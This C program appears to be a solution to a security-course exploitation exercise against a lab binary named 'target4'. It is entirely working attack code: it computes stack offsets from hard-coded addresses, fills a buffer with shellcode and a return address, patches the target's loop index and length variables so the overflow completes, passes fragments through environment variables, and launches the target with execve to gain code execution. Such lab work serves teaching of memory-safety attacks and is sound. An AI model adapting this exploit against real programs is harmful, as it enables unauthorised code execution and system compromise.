#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

#define NOP 0x090
#define NOPSLIDE 0

int main(void)
{
    char *args[3];
    char *env[7];

    int ripAddr = 0x2021fe68;
    int bufAddrStart = 0x2021fdb0;
    int iAddr = 0x2021fe5c;
    int lenAddr = 0x2021fe58;
    int overflowSize = ripAddr - bufAddrStart + 5;
    
    args[0] = TARGET; 
    args[1] =  malloc(sizeof(char) * overflowSize); 
    args[2] = NULL;
    
    env[0] = NULL;

    int *ptr = ( int *) args[1];
    int i; // Have to do this in C99 ffs
    for (i = 0; i < overflowSize; i += 4) {
        // Fill string with address of buffer
        *(ptr++) = (int) bufAddrStart; 
    }
    for (i = 0; i < NOPSLIDE; i++){
        args[1][i] = NOP;
    }
    for (i = NOPSLIDE; i < strlen(shellcode) + NOPSLIDE; ++i) {
        args[1][i] = shellcode[i-NOPSLIDE];    
    }
    
    args[1][overflowSize - 1] = '\0';
    
    ptr = (int * )&(args[1][iAddr-bufAddrStart]);
    *ptr = ( iAddr - bufAddrStart);
        
    ptr = (int * )&(args[1][lenAddr-bufAddrStart]);
    *ptr = overflowSize - 1;
    
    env[0] = "\0";
    env[1] = "\0";
    env[2] = malloc(1);
    memcpy(env[2], &args[1][iAddr - bufAddrStart], 1);
    env[3] = "\0";
    env[4] = "\0";
    env[5] = malloc(overflowSize - (iAddr + 4 - bufAddrStart));
    memcpy(env[5], &args[1][iAddr + 4 - bufAddrStart],overflowSize - (iAddr + 4 - bufAddrStart));
    env[6] = NULL;
    
    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

  return 0;
}
